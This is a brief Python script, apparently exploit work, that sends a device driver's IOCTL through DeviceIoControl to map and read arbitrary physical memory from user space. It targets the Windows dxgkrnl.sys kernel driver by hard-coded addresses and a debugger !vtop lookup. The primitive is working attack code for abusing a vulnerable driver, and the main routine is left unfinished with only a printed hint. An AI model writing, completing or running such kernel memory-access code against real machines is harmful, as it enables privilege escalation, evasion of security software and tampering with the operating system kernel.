
import ctypes
import struct

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa &= ~0xFFF
    inp = struct.pack("<QII", pa, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def read_phys(h, pa, size):
    page_va = map_page(h, pa)
    if not page_va: return None
    return bytes((ctypes.c_ubyte * size).from_address(page_va + (pa & 0xFFF)))

def main():
    # dxgkrnl.sys at fffff80551890000
    # DirBase: 0x1AE000
    
    # We need a way to walk KVA to PA for dxgkrnl
    # Or just use the debugger's !vtop results
    
    # Virtual address of dxgkrnl .text: fffff80551891000
    # Let's find its physical address
    
    print("[*] Use debugger to get physical address of dxgkrnl sections.")
    print("    kd> !vtop 001ae000 fffff80551891000")

if __name__ == "__main__":
    main()
